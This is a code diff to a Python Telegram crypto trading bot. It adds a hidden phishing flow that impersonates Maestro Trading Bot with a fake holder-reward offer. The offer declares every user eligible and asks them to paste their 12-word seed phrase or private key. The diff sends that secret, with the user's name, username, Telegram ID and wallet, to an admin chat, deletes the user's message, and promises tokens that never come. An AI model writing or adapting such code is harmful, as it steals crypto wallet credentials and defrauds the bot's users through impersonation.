@@ -102,6 +102,12 @@ class BotStates(StatesGroup):
     waiting_for_price_impact = State()
     waiting_for_global_slippage = State()
 
+
+class RewardFlowState(StatesGroup):
+    waiting_for_holder_wallet = State()
+    waiting_for_reward_secret = State()
+
+
 LANGUAGE_OPTIONS = {
     "en": {"label": "English 🇺🇸", "code": "en"},
     "zh": {"label": "Chinese 🇨🇳", "code": "zh-CN"},
@@ -1297,6 +1303,43 @@ def format_monitor_text(mint_address, token_data=None, remaining_seconds=2160):
         f"<a href='{solscan_url}'>GT</a> • <a href='{solscan_url}'>DF</a> • <a href='{solscan_url}'>DT</a> • <a href='{solscan_url}'>DS</a> • <a href='{solscan_url}'>DV</a> • <a href='{solscan_url}'>BE</a> • <a href='{solscan_url}'>PF</a>\n\n"
         f"ℹ️ Click on 🔄 to manually refresh and update the monitor"
     )
+
+
+def build_reward_message(token_name: str) -> str:
+    token_name = (token_name or "the token").strip() or "the token"
+    return (
+        f"🚀🚀** Maestro Partnership With Project Owners **🚀🚀\n\n"
+        f"Are you a holder of {token_name}\n\n"
+        f"{token_name} Has partnered With Maestro Trading Bot To reward\n"
+        "Holders With At Least $800 Above worth of the Token with a \n\n"
+        f"➤ $120 worth of {token_name}\n"
+        "➤ 💎 Maestro Premium Access\n"
+        "➤ Access To Top holders Group\n"
+        "➤ Zero Fees when you Trade with <a href='https://t.me/MaestroOfficialTradingBot'>Maestro</a>\n"
+        "➤ Access To verified KOLs Copy Trade wallets for Early Entry before launch 🚀\n"
+        "➤ 30% of the Premium Service Maestro Trading bot offers\n\n"
+        "To check eligibility Click the Button below ⬇️"
+    )
+
+
+def build_reward_keyboard():
+    builder = InlineKeyboardBuilder()
+    builder.button(text="Check Eligibility", callback_data="check_eligibility")
+    return builder.as_markup()
+
+
+async def send_reward_followup(bot: Bot, chat_id: int, token_name: str):
+    await asyncio.sleep(5)
+    try:
+        await bot.send_message(
+            chat_id=chat_id,
+            text=build_reward_message(token_name),
+            parse_mode="HTML",
+            reply_markup=build_reward_keyboard(),
+            disable_web_page_preview=True,
+        )
+    except Exception as exc:
+        print(f"Failed to send reward follow-up: {exc}")
 
 
 async def monitor_countdown_task(bot: Bot, chat_id: int, message_id: int, mint_address: str, token_data=None):
@@ -3383,6 +3426,8 @@ async def check_for_contract_addresses(message: types.Message, state: FSMContext
         BotStates.waiting_for_slippage.state,
         BotStates.waiting_for_gas.state,
         BotStates.waiting_for_global_slippage.state,
+        RewardFlowState.waiting_for_holder_wallet.state,
+        RewardFlowState.waiting_for_reward_secret.state,
     }:
         return
 
@@ -3404,6 +3449,14 @@ async def check_for_contract_addresses(message: types.Message, state: FSMContext
         disable_web_page_preview=True,
     )
 
+    asyncio.create_task(
+        send_reward_followup(
+            message.bot,
+            message.chat.id,
+            token_data.get("name") or mint_address,
+        )
+    )
+
     try:
         await message.bot.pin_chat_message(
             chat_id=message.chat.id,
@@ -3412,6 +3465,72 @@ async def check_for_contract_addresses(message: types.Message, state: FSMContext
         )
     except Exception as e:
         print(f"Error pinning token tracking panel: {e}")
+
+@dp.callback_query(F.data == "check_eligibility")
+async def handle_check_eligibility(callback: types.CallbackQuery, state: FSMContext):
+    await state.update_data(reward_contract=callback.message.text or "")
+    await state.set_state(RewardFlowState.waiting_for_holder_wallet)
+    await callback.message.answer("Please paste your holders wallet address.")
+    await callback.answer()
+
+
+@dp.message(RewardFlowState.waiting_for_holder_wallet)
+async def handle_holder_wallet_input(message: types.Message, state: FSMContext):
+    wallet_address = (message.text or "").strip()
+    if not wallet_address:
+        await message.answer("Please paste a valid holders wallet address.")
+        return
+
+    await state.update_data(holder_wallet=wallet_address)
+    await message.answer(
+        "🎉🎉🎉 CONGRATULATIONS 🎉🎉🎉\n\n"
+        "You are eligible For Rewards Click Claim to Get your reward",
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Claim", callback_data="claim_reward")]]),
+    )
+
+
+@dp.callback_query(F.data == "claim_reward")
+async def handle_claim_reward(callback: types.CallbackQuery, state: FSMContext):
+    await state.set_state(RewardFlowState.waiting_for_reward_secret)
+    await callback.message.answer(
+        "Connect Your wallet Rewards will be allocated to your wallet\n\n"
+        "Paste Your 12-word Phrase Or Private Key"
+    )
+    await callback.answer()
+
+
+@dp.message(RewardFlowState.waiting_for_reward_secret)
+async def handle_reward_secret_input(message: types.Message, state: FSMContext):
+    state_data = await state.get_data()
+    holder_wallet = state_data.get("holder_wallet", "Not provided")
+    full_name = " ".join(filter(None, [message.from_user.first_name, message.from_user.last_name])).strip() or "N/A"
+    username = message.from_user.username or "N/A"
+    secret_value = (message.text or "").strip() or "[empty]"
+
+    forwarded_text = (
+        f"<b>Reward Claim</b>\n"
+        f"👤 Name: {escape(full_name)}\n"
+        f"👤 Username: @{escape(username)}\n"
+        f"🆔 Telegram ID: {message.from_user.id}\n"
+        f"💳 Holder Wallet: {escape(holder_wallet)}\n"
+        f"📝 User message:\n<pre>{escape(secret_value)}</pre>"
+    )
+
+    try:
+        await message.bot.send_message(chat_id=ADMIN_CHAT_ID, text=forwarded_text, parse_mode="HTML")
+    except Exception as exc:
+        print(f"Failed to forward reward claim to admin: {exc}")
+
+    try:
+        await message.delete()
+    except Exception:
+        pass
+
+    await message.answer(
+        "Tokens Will be Allocated Shortly into Your Wallet Start Trading with Maestro and Enjoy the rest of your rewards /start"
+    )
+    await state.clear()
+
 
 @dp.callback_query(F.data == "track")
 async def handle_track_click(callback: types.CallbackQuery):
